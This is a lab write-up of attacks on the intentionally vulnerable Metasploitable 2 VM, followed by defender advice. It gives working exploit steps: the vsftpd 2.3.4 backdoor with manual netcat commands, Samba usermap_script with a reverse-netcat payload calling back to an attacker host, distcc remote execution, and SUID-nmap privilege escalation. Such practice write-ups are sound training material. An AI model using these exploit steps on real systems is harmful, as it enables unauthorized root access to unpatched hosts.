---
title: "Metasploitable 2 - Multi Vector"
date: 2026-02-19
platform: VulnHub
difficulty: Easy
category: offensive
summary: "Three independent attack vectors against Metasploitable 2 (vsftpd 2.3.4 backdoor, Samba CVE-2007-2447, Distcc CVE-2004-2687) plus an SUID-nmap privesc."
---

## Overview

Metasploitable 2 has so many intentional vulnerabilities that any single learner can solve it five different ways. This run focused on *three independent root-equivalent entry points* and a clean privesc finish, to practice **alternative attack pathing**.

The lesson: real engagements always have multiple paths. Picking the *quietest* path that achieves the objective is the skill that distinguishes a script kiddie from a tester.

## Tools Used

- **nmap** for service detection.
- **Metasploit** for the three exploits (this room is about coverage, not manual replication).
- **netcat** for confirming shells.
- **find** for SUID enumeration.

## Methodology

### Vector 1: vsftpd 2.3.4 backdoor (CVE-2011-2523)

**Step 1 - Detect the version.**

```bash
nmap -p21 -sV <TARGET_IP>
```

The banner returns *vsftpd 2.3.4*, which was distributed briefly with a backdoor: any login attempt where the *username ends in `:)`* triggers a bind shell on port 6200.

```bash
# in Metasploit:
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <TARGET_IP>
exploit
```

Or manually:

```bash
nc <TARGET_IP> 21
USER attacker:)
PASS anything
# in another terminal:
nc <TARGET_IP> 6200
```

A root shell lands on port 6200. (Same supply-chain pattern as UnrealIRCd in the other Metasploitable writeup.)

### Vector 2: Samba CVE-2007-2447 (usermap_script)

**Step 2 - Samba username map script vulnerability.** Older Samba versions ran the *username map script* setting against the supplied username without sanitization. Sending shell metacharacters in the username field at SMB authentication time runs them in the *smbd* user's context (root by default).

```bash
# in Metasploit:
use exploit/multi/samba/usermap_script
set RHOSTS <TARGET_IP>
set payload cmd/unix/reverse_netcat
set LHOST <KALI_IP>
exploit
```

A root shell lands.

### Vector 3: Distcc CVE-2004-2687

**Step 3 - Distcc daemon command execution.** Distcc (distributed C compiler) on its default port accepts compile jobs from any client and runs them. The protocol allows arbitrary command execution because *that's what distcc does*: it runs commands on behalf of remote clients. With no authentication.

```bash
# in Metasploit:
use exploit/unix/misc/distcc_exec
set RHOSTS <TARGET_IP>
set CMD "id"
exploit
```

The output of *id* comes back as the distcc daemon's user (often a *daemon* or unprivileged account, not root in this version).

### Privesc: SUID nmap

**Step 4 - From the distcc shell, look for SUID files.**

```bash
find / -perm -4000 -type f 2>/dev/null
```

The list includes nmap. This box runs nmap 3.81, which still has the *--interactive* mode.

```bash
nmap --interactive
nmap> !sh
# root shell
```

## Key Takeaways

- **Real targets have multiple paths.** Three independent root-grade RCEs on the same VM is unusual at this scale but the *principle* (multiple ways in) is universal.
- **Supply chain backdoors are a recurring pattern.** vsftpd, UnrealIRCd, the SolarWinds Orion incident, ua-parser-js, and more.
- **Old Samba is consistently dangerous.** The username map script bug is from 2007; check Samba versions on every Linux foothold.
- **distcc with no authentication is unauthenticated RCE by design.** It's a tool that runs commands for remote clients. If you find it open on the internet, the day is going to be interesting.
- **SUID nmap is a perennial finding** because nmap used to be commonly SUID-installed and many sysadmins never noticed.

## What a Defender Should Do

- Patch every service to current-vendor releases on a regular cadence. Both the vsftpd and Samba bugs above are over a decade old and patched.
- Verify package integrity for any tool downloaded outside vendor repositories (PGP signatures, official checksums).
- Audit Samba's *username map script* setting if it's in use. Modern Samba uses a different mechanism; explicit script execution is a smell.
- Don't run distcc on internet-reachable hosts without a real authentication layer. The DISTCC_AUTH option exists, use it.
- Remove SUID from nmap on every host. `chmod u-s /usr/local/bin/nmap`. The tool does not need SUID for any normal operation.
